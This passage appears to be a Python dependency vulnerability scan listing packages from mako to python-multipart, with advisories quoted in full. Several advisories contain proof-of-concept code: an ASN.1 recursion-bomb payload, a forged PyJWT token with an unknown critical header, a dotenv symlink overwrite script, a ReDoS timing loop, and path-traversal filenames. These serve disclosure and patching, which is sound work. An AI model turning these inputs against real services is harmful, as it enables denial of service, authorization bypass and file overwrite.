  Fix: 6.1.0
[null] mako 1.3.10
  CVE-2026-44307: ## Summary  On Windows, a URI using backslash traversal (e.g. `\..\..\ secret.txt`) bypasses the directory traversal check in `Template.__init__` and the `posixpath`-based normalization in `TemplateLookup.get_template()`, allowing reads of files outside the configured template directory.   ## Details  The root cause is a mismatch between `posixpath` (used for URI normalization in `get_template()`) and `os.path` (used for file access via `os.path.isfile()` and validation via `os.path.normpath()` in `Template.__init__`). On Windows, `os.path` is `ntpath`, which treats `\` as a path separator, while `posixpath` treats it as a literal character.  The vulnerability chain:  1. `get_template()` strips only leading `/` via `re.sub(r"^\/+", "", uri)` and normalizes with `posixpath` — backslash `\` is treated as a literal character, so `\..\ secret.txt` passes through with `..` undetected. 2. `Template.__init__()` validation uses `os.path.normpath()` — on Windows this resolves `\..\ secret.txt` to `\secret.txt`, which does not start with `..`, so the `startswith("..")` check passes. 3. `os.path.isfile()` on Windows interprets `\` as a path separator, resolving the `..` traversal and finding files outside the template directory.  ### Affected code  - `mako/lookup.py`: `TemplateLookup.get_template()` uses `posixpath.normpath`/`posixpath.join` for path construction but `os.path.isfile()` for existence check - `mako/template.py`: `Template.__init__()` URI validation uses `os.path.normpath()` which on Windows resolves backslash traversal to a form that passes the `startswith("..")` guard  ## Impact  If an application passes user-controlled template names or include paths to `TemplateLookup.get_template()`, an attacker on Windows may be able to load and disclose readable files outside the configured template directory. The primary impact is local file disclosure. If the targeted file contains Mako/Python template syntax, it may also be parsed and executed as a template.  ## Remediation  The fix should normalize backslashes to forward slashes early in the URI processing pipeline, before any path operations, to ensure consistent behavior across platforms.
  Fix: 1.3.12
[null] markdown 3.7
  PYSEC-2026-89: Python-Markdown version 3.8 contain a vulnerability where malformed HTML-like sequences can cause html.parser.HTMLParser to raise an unhandled AssertionError during Markdown parsing. Because Python-Markdown does not catch this exception, any application that processes attacker-controlled Markdown may crash. This enables remote, unauthenticated Denial of Service in web applications, documentation systems, CI/CD pipelines, and any service that renders untrusted Markdown. The issue was acknowledged by the vendor and fixed in version 3.8.1. This issue causes a remote Denial of Service in any application parsing untrusted Markdown, and can lead to Information Disclosure through uncaught exceptions.
  Fix: 3.8.1
[null] markdown-it-py 3.0.0
  null: null
  Fix: No fix available
[null] markupsafe 3.0.2
  null: null
  Fix: No fix available
[null] marshmallow 3.26.1
  PYSEC-2026-1605: ### Impact  `Schema.load(data, many=True)` is vulnerable to denial of service attacks. A moderately sized request can consume a disproportionate amount of CPU time.  ### Patches  4.1.2, 3.26.2  ### Workarounds  ```py # Fail fast def load_many(schema, data, **kwargs):     if not isinstance(data, list):         raise ValidationError(['Invalid input type.'])     return [schema.load(item, **kwargs) for item in data] ```
  Fix: 3.26.2
[null] matplotlib 3.10.8
  null: null
  Fix: No fix available
[null] matplotlib-inline 0.2.1
  null: null
  Fix: No fix available
[null] mccabe 0.7.0
  null: null
  Fix: No fix available
[null] mdurl 0.1.2
  null: null
  Fix: No fix available
[null] milvus-lite 2.4.12
  null: null
  Fix: No fix available
[null] mistune 3.2.0
  PYSEC-2026-168: Mistune is a Python Markdown parser with renderers and plugins. In 3.2.0 and realier, in src/mistune/directives/image.py, the render_figure() function concatenates figclass and figwidth options directly into HTML attributes without escaping. This allows attribute injection and XSS even when HTMLRenderer(escape=True) is used, because these values bypass the inline renderer.
  Fix: 3.2.1
[null] mlforecast 1.0.31
  null: null
  Fix: No fix available
[null] mmh3 5.1.0
  null: null
  Fix: No fix available
[null] monotonic 1.6
  null: null
  Fix: No fix available
[null] moto 5.1.3
  null: null
  Fix: No fix available
[null] mpmath 1.3.0
  null: null
  Fix: No fix available
[null] msal 1.32.0
  null: null
  Fix: No fix available
[null] msal-extensions 1.3.1
  null: null
  Fix: No fix available
[null] msgpack 1.1.2
  GHSA-6v7p-g79w-8964: ### Impact  If the Unpacker is used repeatedly after an error occurs, the process may crash with a SEGV.  If the Unpacker is used repeatedly to unpack untrusted input from external sources, it may be vulnerable to a DoS attack.  ### Patches  v1.2.1  ### Workarounds  Users should create a new Unpacker instead of reusing the same Unpacker after an error occurs.  Applying the above patch can prevent SEGV, but reusing the Streaming Unpacker after it has encountered an error will not yield correct data. If an error occurs during Streaming Unpacking, the Stream and Streaming Unpacker should be discarded.  Therefore, this is not just a workaround but the correct solution. The above patch only prevents crashes from incorrect usage.
  Fix: 1.2.1
[null] msoffcrypto-tool 5.4.2
  null: null
  Fix: No fix available
[null] multidict 6.4.3
  null: null
  Fix: No fix available
[null] multimodal-crawler null
  null: null
  Fix: No fix available
[null] multiprocess 0.70.16
  null: null
  Fix: No fix available
[null] multitasking 0.0.12
  null: null
  Fix: No fix available
[null] mypy 1.20.2
  null: null
  Fix: No fix available
[null] mypy-extensions 1.0.0
  null: null
  Fix: No fix available
[null] narwhals 2.13.0
  null: null
  Fix: No fix available
[null] nbclient 0.10.4
  null: null
  Fix: No fix available
[null] nbconvert 7.17.1
  null: null
  Fix: No fix available
[null] nbformat 5.10.4
  null: null
  Fix: No fix available
[null] nest-asyncio 1.6.0
  null: null
  Fix: No fix available
[null] networkx 3.4.2
  null: null
  Fix: No fix available
[null] ninja 1.11.1.4
  null: null
  Fix: No fix available
[null] nltk 3.9.1
  PYSEC-2026-96: A critical vulnerability exists in the NLTK downloader component of nltk/nltk, affecting all versions. The _unzip_iter function in nltk/downloader.py uses zipfile.extractall() without performing path validation or security checks. This allows attackers to craft malicious zip packages that, when downloaded and extracted by NLTK, can execute arbitrary code. The vulnerability arises because NLTK assumes all downloaded packages are trusted and extracts them without validation. If a malicious package contains Python files, such as __init__.py, these files are executed automatically upon import, leading to remote code execution. This issue can result in full system compromise, including file system access, network access, and potential persistence mechanisms.
  Fix: 3.9.3
[null] notebook 7.5.5
  CVE-2026-40171: ### Impact  A stored Cross-Site Scripting (XSS) vulnerability in Jupyter Notebook allows attackers to steal authentication tokens from users who open malicious notebook files and interact with elements that the attacker can make look indistinguishable from legitimate controls (single click interaction).  The vulnerability enables complete account takeover through the Jupyter REST API, allowing the attacker to: 1. Read all files 2. Modify/create files 3. Access running kernels and execute arbitrary code 4. Create terminals for shell access  ### Patches  Jupyter Notebook 7.5.6 and JupyterLab 4.5.7 include patches for this vulnerability.  ### Workarounds  The help extension can be disabled via CLI:  ``` jupyter labextension disable @jupyter-notebook/help-extension jupyter labextension disable @jupyterlab/help-extension ```  ### Hardening  The patched versions include a toggle to disable the command linker functionality altogether, for example via `overrides.json`:  ```json {   "@jupyterlab/apputils-extension:sanitizer": {     "allowCommandLinker": false   } } ```  ### Resources  - https://jupyterlab.readthedocs.io/en/latest/user/commands.html#commands-in-markdown-output-and-files  ### Acknowledgments  Reported by Daniel Teixeira - NVIDIA AI Red Team
  Fix: 7.5.6
[null] notebook-shim 0.2.4
  null: null
  Fix: No fix available
[null] numba 0.65.0
  null: null
  Fix: No fix available
[null] numpy 2.3.5
  null: null
  Fix: No fix available
[null] oauthlib 3.2.2
  null: null
  Fix: No fix available
[null] olefile 0.47
  null: null
  Fix: No fix available
[null] oletools 0.60.2
  null: null
  Fix: No fix available
[null] onnxruntime 1.20.1
  null: null
  Fix: No fix available
[null] openai 1.72.0
  null: null
  Fix: No fix available
[null] opencv-python 4.11.0.86
  null: null
  Fix: No fix available
[null] opencv-python-headless 4.11.0.86
  null: null
  Fix: No fix available
[null] openpyxl 3.1.5
  null: null
  Fix: No fix available
[null] opensearch-py 2.8.0
  null: null
  Fix: No fix available
[null] opentelemetry-api 1.32.0
  null: null
  Fix: No fix available
[null] opentelemetry-exporter-otlp-proto-common 1.32.0
  null: null
  Fix: No fix available
[null] opentelemetry-exporter-otlp-proto-grpc 1.32.0
  null: null
  Fix: No fix available
[null] opentelemetry-instrumentation 0.53b0
  null: null
  Fix: No fix available
[null] opentelemetry-instrumentation-asgi 0.53b0
  null: null
  Fix: No fix available
[null] opentelemetry-instrumentation-fastapi 0.53b0
  null: null
  Fix: No fix available
[null] opentelemetry-proto 1.32.0
  null: null
  Fix: No fix available
[null] opentelemetry-sdk 1.32.0
  null: null
  Fix: No fix available
[null] opentelemetry-semantic-conventions 0.53b0
  null: null
  Fix: No fix available
[null] opentelemetry-util-http 0.53b0
  null: null
  Fix: No fix available
[null] optuna 4.7.0
  null: null
  Fix: No fix available
[null] orjson 3.10.16
  PYSEC-2026-107: The orjson.dumps function in orjson before 3.11.6 does not limit recursion for deeply nested JSON documents.
  Fix: 3.11.6
[null] overrides 7.7.0
  null: null
  Fix: No fix available
[null] packageurl-python 0.17.6
  null: null
  Fix: No fix available
[null] packaging 24.2
  null: null
  Fix: No fix available
[null] pandas 2.2.3
  null: null
  Fix: No fix available
[null] pandocfilters 1.5.1
  null: null
  Fix: No fix available
[null] parso 0.8.6
  null: null
  Fix: No fix available
[null] passlib 1.7.4
  null: null
  Fix: No fix available
[null] pathspec 1.1.0
  null: null
  Fix: No fix available
[null] patsy 1.0.2
  null: null
  Fix: No fix available
[null] pcodedmp 1.2.6
  null: null
  Fix: No fix available
[null] peewee 3.17.9
  null: null
  Fix: No fix available
[null] peewee-migrate 1.13.0
  null: null
  Fix: No fix available
[null] pexpect 4.9.0
  null: null
  Fix: No fix available
[null] pgvector 0.4.0
  null: null
  Fix: No fix available
[null] pillow 11.1.0
  PYSEC-2026-165: If a font advances for each glyph by an exceeding large amount, when Pillow keeps track of the current position, it may lead to an integer overflow. This has been fixed.
  Fix: 12.2.0
[null] pip 25.3
  PYSEC-2026-196: pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.
  Fix: 26.1.2
[null] pip-api 0.0.34
  null: null
  Fix: No fix available
[null] pip-audit 2.10.0
  null: null
  Fix: No fix available
[null] pip-requirements-parser 32.0.1
  null: null
  Fix: No fix available
[null] platformdirs 4.3.7
  null: null
  Fix: No fix available
[null] playwright 1.49.1
  null: null
  Fix: No fix available
[null] plotly 6.5.0
  null: null
  Fix: No fix available
[null] pluggy 1.5.0
  null: null
  Fix: No fix available
[null] polars 1.40.1
  null: null
  Fix: No fix available
[null] polars-runtime-32 1.40.1
  null: null
  Fix: No fix available
[null] polygon-api-client 1.16.3
  null: null
  Fix: No fix available
[null] portalocker 2.10.1
  null: null
  Fix: No fix available
[null] posthog 3.24.1
  null: null
  Fix: No fix available
[null] primp 0.14.0
  null: null
  Fix: No fix available
[null] prometheus-client 0.19.0
  null: null
  Fix: No fix available
[null] prompt-toolkit 3.0.52
  null: null
  Fix: No fix available
[null] propcache 0.3.1
  null: null
  Fix: No fix available
[null] proto-plus 1.26.1
  null: null
  Fix: No fix available
[null] protobuf 5.29.4
  PYSEC-2026-1806: ### Summary Any project that uses Protobuf pure-Python backend to parse untrusted Protocol Buffers data containing an arbitrary number of **recursive groups**, **recursive messages** or **a series of [`SGROUP`](https://protobuf.dev/programming-guides/encoding/#groups) tags** can be corrupted by exceeding the Python recursion limit.  Reporter: Alexis Challande, Trail of Bits Ecosystem Security Team [ecosystem@trailofbits.com](mailto:ecosystem@trailofbits.com)  Affected versions: This issue only affects the [pure-Python implementation](https://github.com/protocolbuffers/protobuf/tree/main/python#implementation-backends) of protobuf-python backend. This is the implementation when `PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python` environment variable is set or the default when protobuf is used from Bazel or pure-Python PyPi wheels. CPython PyPi wheels do not use pure-Python by default.  This is a Python variant of a [previous issue affecting protobuf-java](https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8).  ### Severity This is a potential Denial of Service. Parsing nested protobuf data creates unbounded recursions that can be abused by an attacker.  ### Proof of Concept For reproduction details, please refer to the unit tests [decoder_test.py](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98) and [message_test](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478)  ### Remediation and Mitigation A mitigation is available now. Please update to the latest available versions of the following packages: * protobuf-python(4.25.8, 5.29.5, 6.31.1)
  Fix: 4.25.8
[null] psutil 7.0.0
  null: null
  Fix: No fix available
[null] psycopg2-binary 2.9.10
  null: null
  Fix: No fix available
[null] psygnal 0.15.1
  null: null
  Fix: No fix available
[null] ptyprocess 0.7.0
  null: null
  Fix: No fix available
[null] pure-eval 0.2.3
  null: null
  Fix: No fix available
[null] py-partiql-parser 0.6.1
  null: null
  Fix: No fix available
[null] py-serializable 2.1.0
  null: null
  Fix: No fix available
[null] pyarrow 19.0.1
  PYSEC-2026-113: Use After Free vulnerability in Apache Arrow C++.  This issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object) that is written to the dangling pointer is not under direct control of the attacker.  Pre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.  The most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.  Advice for users of Arrow C++:  1. check whether you enable pre-buffering on the IPC file reader (using `RecordBatchFileReader::PreBufferMetadata`)   2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable
  Fix: 23.0.1
[null] pyasn1 0.4.8
  CVE-2026-30922: ### Summary The `pyasn1` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing nested `SEQUENCE` (`0x30`) or `SET` (`0x31`) tags with Indefinite Length (`0x80`) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a `RecursionError` or consumes all available memory (OOM), crashing the host application.  ### Details The vulnerability exists because the decoder iterates through the input stream and recursively calls `decodeFun` (the decoding callback) for every nested component found, without tracking or limiting the recursion depth. Vulnerable Code Locations: 1. `indefLenValueDecoder` (Line 998): ```for component in decodeFun(substrate, asn1Spec, allowEoo=True, **options):``` This method handles indefinite-length constructed types. It sits inside a `while True` loop and recursively calls the decoder for every nested tag.  2. `valueDecoder` (Lines 786 and 907): ```for component in decodeFun(substrate, componentType, **options):``` This method handles standard decoding when a schema is present. It contains two distinct recursive calls that lack depth checks: Line 786: Recursively decodes components of `SEQUENCE` or `SET` types. Line 907: Recursively decodes elements of `SEQUENCE OF` or `SET OF` types.  4. `_decodeComponentsSchemaless` (Line 661): ```for component in decodeFun(substrate, **options):``` This method handles decoding when no schema is provided.  In all three cases, `decodeFun` is invoked without passing a `depth` parameter or checking against a global `MAX_ASN1_NESTING` limit.  ### PoC ``` import sys from pyasn1.codec.ber import decoder  sys.setrecursionlimit(100000)  print("[*] Generating Recursion Bomb Payload...") depth = 50_000 chunk = b'\x30\x80'  payload = chunk * depth  print(f"[*] Payload size: {len(payload) / 1024:.2f} KB") print("[*] Triggering Decoder...")  try:     decoder.decode(payload) except RecursionError:     print("[!] Crashed: Recursion Limit Hit") except MemoryError:     print("[!] Crashed: Out of Memory") except Exception as e:     print(f"[!] Crashed: {e}") ```  ``` [*] Payload size: 9.77 KB [*] Triggering Decoder... [!] Crashed: Recursion Limit Hit ```  ### Impact - This is an unhandled runtime exception that typically terminates the worker process or thread handling the request. This allows a remote attacker to trivially kill service workers with a small payload (<100KB), resulting in a Denial of Service. Furthermore, in environments where recursion limits are increased, this leads to server-wide memory exhaustion. - Service Crash: Any service using `pyasn1` to parse untrusted ASN.1 data (e.g., LDAP, SNMP, Kerberos, X.509 parsers) can be crashed remotely. - Resource Exhaustion: The attack consumes RAM linearly with the nesting depth. A small payload (<200KB) can consume hundreds of megabytes of RAM or exhaust the stack.  ### Credits Vulnerability discovered by Kevin Tu of TMIR at ByteDance.
  Fix: 0.6.3
[null] pyasn1-modules 0.4.2
  null: null
  Fix: No fix available
[null] pyclipper 1.3.0.post6
  null: null
  Fix: No fix available
[null] pycodestyle 2.14.0
  null: null
  Fix: No fix available
[null] pycparser 2.22
  null: null
  Fix: No fix available
[null] pydantic 2.11.3
  null: null
  Fix: No fix available
[null] pydantic-core 2.33.1
  null: null
  Fix: No fix available
[null] pydantic-settings 2.8.1
  null: null
  Fix: No fix available
[null] pydeck 0.9.1
  null: null
  Fix: No fix available
[null] pydub 0.25.1
  null: null
  Fix: No fix available
[null] pyee 12.0.0
  null: null
  Fix: No fix available
[null] pyflakes 3.2.0
  null: null
  Fix: No fix available
[null] pygments 2.19.2
  CVE-2026-4539: A security flaw has been discovered in pygments before 2.20.0. The impacted element is the function AdlLexer of the file pygments/lexers/archetype.py. The manipulation results in inefficient regular expression complexity. The attack is only possible with local access. The exploit has been released to the public and may be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.
  Fix: 2.20.0
[null] pyjwt 2.10.1
  PYSEC-2026-120: ## Summary  PyJWT does not validate the `crit` (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a `crit` array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the **MUST** requirement in the RFC.  This is the same class of vulnerability as CVE-2025-59420 (Authlib), which received CVSS 7.5 (HIGH).  ---  ## RFC Requirement  RFC 7515 §4.1.11:  > The "crit" (Critical) Header Parameter indicates that extensions to this > specification and/or [JWA] are being used that **MUST** be understood and > processed. [...] If any of the listed extension Header Parameters are > **not understood and supported** by the recipient, then the **JWS is invalid**.  ---  ## Proof of Concept  ```python import jwt  # PyJWT 2.8.0 import hmac, hashlib, base64, json  # Construct token with unknown critical extension header = {"alg": "HS256", "crit": ["x-custom-policy"], "x-custom-policy": "require-mfa"} payload = {"sub": "attacker", "role": "admin"}  def b64url(data):     return base64.urlsafe_b64encode(data).rstrip(b"=").decode()  h = b64url(json.dumps(header, separators=(",", ":")).encode()) p = b64url(json.dumps(payload, separators=(",", ":")).encode()) sig = b64url(hmac.new(b"secret", f"{h}.{p}".encode(), hashlib.sha256).digest()) token = f"{h}.{p}.{sig}"  # Should REJECT — x-custom-policy is not understood by PyJWT try:     result = jwt.decode(token, "secret", algorithms=["HS256"])     print(f"ACCEPTED: {result}")     # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'} except Exception as e:     print(f"REJECTED: {e}") ```  **Expected:** `jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy` **Actual:** Token accepted, payload returned.  ### Comparison with RFC-compliant library  ```python # jwcrypto — correctly rejects from jwcrypto import jwt as jw_jwt, jwk key = jwk.JWK(kty="oct", k=b64url(b"secret")) jw_jwt.JWT(jwt=token, key=key, algs=["HS256"]) # raises: InvalidJWSObject('Unknown critical header: "x-custom-policy"') ```  ---  ## Impact  - **Split-brain verification** in mixed-library deployments (e.g., API   gateway using jwcrypto rejects, backend using PyJWT accepts) - **Security policy bypass** when `crit` carries enforcement semantics   (MFA, token binding, scope restrictions) - **Token binding bypass** — RFC 7800 `cnf` (Proof-of-Possession) can be   silently ignored - See CVE-2025-59420 for full impact analysis  ---  ## Suggested Fix  In `jwt/api_jwt.py`, add validation in `_validate_headers()` or `decode()`:  ```python _SUPPORTED_CRIT = {"b64"}  # Add extensions PyJWT actually supports  def _validate_crit(self, headers: dict) -> None:     crit = headers.get("crit")     if crit is None:         return     if not isinstance(crit, list) or len(crit) == 0:         raise InvalidTokenError("crit must be a non-empty array")     for ext in crit:         if ext not in self._SUPPORTED_CRIT:             raise InvalidTokenError(f"Unsupported critical extension: {ext}")         if ext not in headers:             raise InvalidTokenError(f"Critical extension {ext} not in header") ```  ---  ## CWE  - CWE-345: Insufficient Verification of Data Authenticity - CWE-863: Incorrect Authorization  ## References  - [RFC 7515 §4.1.11](https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11) - [CVE-2025-59420 — Authlib crit bypass (CVSS 7.5)](https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32) - [RFC 7800 — Proof-of-Possession Key Semantics](https://www.rfc-editor.org/rfc/rfc7800)
  Fix: 2.12.0
[null] pylint 3.0.3
  null: null
  Fix: No fix available
[null] pymdown-extensions 10.14.3
  PYSEC-2026-1825: ### Impact  This issue describes a ReDOS bug found within the figure caption extension (`pymdownx.blocks.caption` ).  In systems that take unchecked user content, this could cause long hangs when processing the data if a malicious payload was crafted.  ### Patches  This issue is patched in Release [10.16.1](https://pypi.org/project/pymdown-extensions/10.16.1/).  ### Workarounds  Some possible workarounds  If users are concerned about this vulnerability and process unknown user content without timeouts or other safeguards in place to prevent really large, malicious content being aimed at systems, the use of `pymdownx.blocks.caption` could be avoided until the library is updated to 10.16.1+.  ### References  The original issue https://github.com/facelessuser/pymdown-extensions/issues/2716.  ### Description  The original issue came through PyMdown Extensions' normal issue tracker instead of the typical security flow: https://github.com/facelessuser/pymdown-extensions/issues/2716. Because this came through the normal issue flow, it was handled as a normal issue. In the future, PyMdown Extensions will ensure such issues, even if prematurely made public through the normal issue flow, are redirected through the typical security process.  The regular expression pattern in question is as follows:  ```py RE_FIG_NUM = re.compile(r'^(\^)?([1-9][0-9]*(?:.[1-9][0-9]*)*)(?= |$)') ```  The POC was provided by @ShangzhiXu  ```py import re import time  regex_pattern = re.compile(r'^(\^)?([1-9][0-9]*(?:.[1-9][0-9]*)*)(?= |$)')  for i in range(50, 500, 50):     long_string = '1' * i + 'a'     start_time = time.time()     match = re.match(regex_pattern, long_string)     end_time = time.time()     print(f"long_string execution time: {end_time - start_time:.6f} s") ```  The issue with the above pattern is that `.` was used, which accepts any character when we meant to use `\.`. The fix was to update the pattern to:  ```py RE_FIG_NUM = re.compile(r'^(\^)?([1-9][0-9]*(?:\.[1-9][0-9]*)*)(?= |$)') ```  Relevant PR with fix: https://github.com/facelessuser/pymdown-extensions/pull/2717  ### Version(s) & System Info  - Operating System: Any - Python Version: Any
  Fix: 10.16.1
[null] pymilvus 2.5.6
  null: null
  Fix: No fix available
[null] pymongo 4.12.0
  null: null
  Fix: No fix available
[null] pymupdf 1.27.2.3
  null: null
  Fix: No fix available
[null] pymysql 1.1.1
  null: null
  Fix: No fix available
[null] pypandoc 1.15
  null: null
  Fix: No fix available
[null] pyparsing 3.2.3
  null: null
  Fix: No fix available
[null] pypdf 5.4.0
  PYSEC-2026-1833: ### Impact  An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires parsing the content stream of a page which has an inline image using the DCTDecode filter.  ### Patches This has been fixed in [pypdf==6.1.3](https://github.com/py-pdf/pypdf/releases/tag/6.1.3).  ### Workarounds If you cannot upgrade yet, consider applying the changes from PR [#3501](https://github.com/py-pdf/pypdf/pull/3501).
  Fix: 6.1.3
[null] pypika 0.48.9
  null: null
  Fix: No fix available
[null] pyproject-hooks 1.2.0
  null: null
  Fix: No fix available
[null] pysocks 1.7.1
  null: null
  Fix: No fix available
[null] pytest 9.0.3
  null: null
  Fix: No fix available
[null] pytest-asyncio 1.3.0
  null: null
  Fix: No fix available
[null] pytest-cov 7.1.0
  null: null
  Fix: No fix available
[null] pytest-docker 3.2.1
  null: null
  Fix: No fix available
[null] pytest-mock 3.12.0
  null: null
  Fix: No fix available
[null] pytest-timeout 2.2.0
  null: null
  Fix: No fix available
[null] pytest-xdist 3.5.0
  null: null
  Fix: No fix available
[null] python-dateutil 2.9.0.post0
  null: null
  Fix: No fix available
[null] python-dotenv 1.1.0
  CVE-2026-28684: ### Summary  `set_key()` and `unset_key()` in python-dotenv follow symbolic links when rewriting `.env` files, allowing a local attacker to overwrite arbitrary files via a crafted symlink when a cross-device rename fallback is triggered.   ### Details  The `rewrite()` context manager in `dotenv/main.py` is used by both `set_key()` and `unset_key()` to safely modify `.env` files. It works by writing to a temporary file (created in the system's default temp directory, typically `/tmp`) and then using `shutil.move()` to replace the original file.  When the `.env` path is a symbolic link and the temp directory resides on a different filesystem than the target (a common configuration on Linux systems using tmpfs for `/tmp`), the following sequence occurs:  1. `shutil.move()` first attempts `os.rename()`, which fails with an `OSError` because atomic renames cannot cross device boundaries. 2. On failure, `shutil.move()` falls back to `shutil.copy2()` followed by `os.unlink()`. 3. `shutil.copy2()` calls `shutil.copyfile()` with `follow_symlinks=True` by default. 4. This causes the content to be written to the **symlink target** rather than replacing the symlink itself.  An attacker who has write access to the directory containing a `.env` file can pre-place a symlink pointing to any file that the application process has write access to. When the application (or a privileged process such as a deploy script, Docker entrypoint, or CI pipeline) calls `set_key()` or `unset_key()`, the symlink target is overwritten with the new `.env` content.  This vulnerability does not require a race condition and is fully deterministic once the preconditions are met.  ### Impact The primary impacts are to **integrity** and **availability**:  - **File overwrite / destruction (DoS):** An attacker can cause an application or privileged process to corrupt or destroy configuration files, database configs, or other sensitive files it would not normally have access to modify. - **Integrity violation:** The target file's original content is replaced with `.env`-formatted content controlled by the attacker. - **Potential privilege escalation:** In scenarios where a privileged process (running as root or a service account) calls `set_key()`, the attacker can leverage this to write to files beyond their own access level.  The scope of impact depends on the application using python-dotenv and the privileges under which it runs.   ### Proof of Concept  The following script demonstrates the vulnerability. It requires `/tmp` and the user's home directory to reside on different devices (common on systemd-based Linux systems with tmpfs).  ```python import os import sys import tempfile from dotenv import set_key  # Pre-condition: /tmp must be on a different device than the target directory. tmp_dev = os.stat("/tmp").st_dev home_dev = os.stat(os.path.expanduser("~")).st_dev assert tmp_dev != home_dev, "Skipped: /tmp and ~ are on the same device (no cross-device move)"  with tempfile.TemporaryDirectory(dir=os.path.expanduser("~")) as workdir:     # File an attacker wants to overwrite     target = os.path.join(workdir, "victim_config.txt")     with open(target, "w") as f:         f.write("DB_PASSWORD=supersecret\n")      # Attacker pre-places a symlink at the path the application will use as .env     env_symlink = os.path.join(workdir, ".env")     os.symlink(target, env_symlink)      before = open(target).read()      # Application writes a new key -- triggers the cross-device fallback     set_key(env_symlink, "INJECTED", "attacker_value")      after = open(target).read()      print("Before:", repr(before))     print("After: ", repr(after))     print("Symlink target overwritten:", target) ```  **Expected output:** ``` Before: 'DB_PASSWORD=supersecret\n' After:  "DB_PASSWORD=supersecret\nINJECTED='attacker_value'\n" Symlink target overwritten: /home/user/tmp806nut2g/victim_config.txt ```  ### Remediation  The fix changes the `rewrite()` context manager in the following ways:  1. **Symlinks are no longer followed by default.** When the `.env` path is a symlink, `rewrite()` now resolves it to the real path before proceeding, or (by default) operates on the symlink entry itself rather than the target. 2. **A `follow_symlinks: bool = False` parameter** is added to `set_key()` and `unset_key()` for users who explicitly need the old behavior. 3. **Temp files are written in the same directory** as the target `.env` file (instead of the system temp directory), eliminating the cross-device rename condition entirely. 4. **`os.replace()` is used instead of `shutil.move()`**, providing atomic replacement without symlink-following fallback behavior.  Users are advised to upgrade to the patched version as soon as it is available on PyPI.  ### Timeline  | Date             | Event                                                                                                                                                                 | | ------------ | ---------------------------------------------------------------------------------------------------- | | 2026-01-09  | Initial report received from Giorgos Tsigourakos regarding a separate, unrelated issue also located in `rewrite()` | | 2026-01-10   | Co-maintainer acknowledged report, requested clarification                                                         | | 2026-01-11    | Initial report assessed as not exploitable and closed                                                              | | 2026-02-24  | Reporter identified new, distinct cross-device symlink attack vector with deterministic exploitation               | | 2026-02-26  | Co-maintainer confirmed vulnerability and shared draft patch                                                       | | 2026-02-26  | Reporter validated fix with monkeypatched PoC, proposed CVSS                                                       | | 2026-03-01   | Patch merged to main                                                                                               | | 2026-03-01   | Patched version released to PyPI                                                                                   | | 2026-04-20   | Advisory published                                                                                                 |  ### Patches  Upgrade to v.1.2.2 or use the patch from https://github.com/theskumar/python-dotenv/commit/790c5c02991100aa1bf41ee5330aca75edc51311.patch
  Fix: 1.2.2
[null] python-engineio 4.11.2
  CVE-2026-48802: ### Impact An attacker can cause the creation of unnecessary background threads in the python-engineio server by exploiting the heartbeat mechanism, which launches a thread when a new connection is received, and when the client sends a PONG packet.  Note: this issue primarily affects synchronous servers. Asynchronous servers allocate background tasks instead of physical threads, which are lightweight and less likely to cause denial of service. However, the fix that was implemented was also applied to the asynchronous case.  ### Patches Version 4.13.2 addresses this issue as follows:  - The initial background thread (or async task( for heartbeat management is only launched if a client passes authentication in the `connect` handler. - The server now ensures that there is only one background heatbeat thread (or async task) per client at a given point in time. Out of sequence PONG packets are now discarded when an active heartbeat thread is already running.
  Fix: 4.13.2
[null] python-iso639 2025.2.18
  null: null
  Fix: No fix available
[null] python-jose 3.4.0
  null: null
  Fix: No fix available
[null] python-json-logger 4.1.0
  null: null
  Fix: No fix available
[null] python-magic 0.4.27
  null: null
  Fix: No fix available
[null] python-multipart 0.0.20
  PYSEC-2026-1852: ### Summary  A Path Traversal vulnerability exists when using non-default configuration options `UPLOAD_DIR` and `UPLOAD_KEEP_FILENAME=True`. An attacker can write uploaded files to arbitrary locations on the filesystem by crafting a malicious filename.  ### Details  When `UPLOAD_DIR` is set and `UPLOAD_KEEP_FILENAME` is `True`, the library constructs the file path using `os.path.join(file_dir, fname)`. Due to the behavior of `os.path.join()`, if the filename begins with a `/`, all preceding path components are discarded:  ```py os.path.join("/upload/dir", "/etc/malicious") == "/etc/malicious" ```                          This allows an attacker to bypass the intended upload directory and write files to arbitrary paths.                                                                                                                                                                                         #### Affected Configuration                                                                                                                                                                                                                                                                      Projects are only affected if all of the following are true:                                                                                      - `UPLOAD_DIR` is set - `UPLOAD_KEEP_FILENAME` is set to True - The uploaded file exceeds `MAX_MEMORY_FILE_SIZE` (triggering a flush to disk)  The default configuration is not vulnerable.                                                                                                                                                                                                                                                #### Impact                                                                                                                                                                                                                                                                                   Arbitrary file write to attacker-controlled paths on the filesystem.                                                                     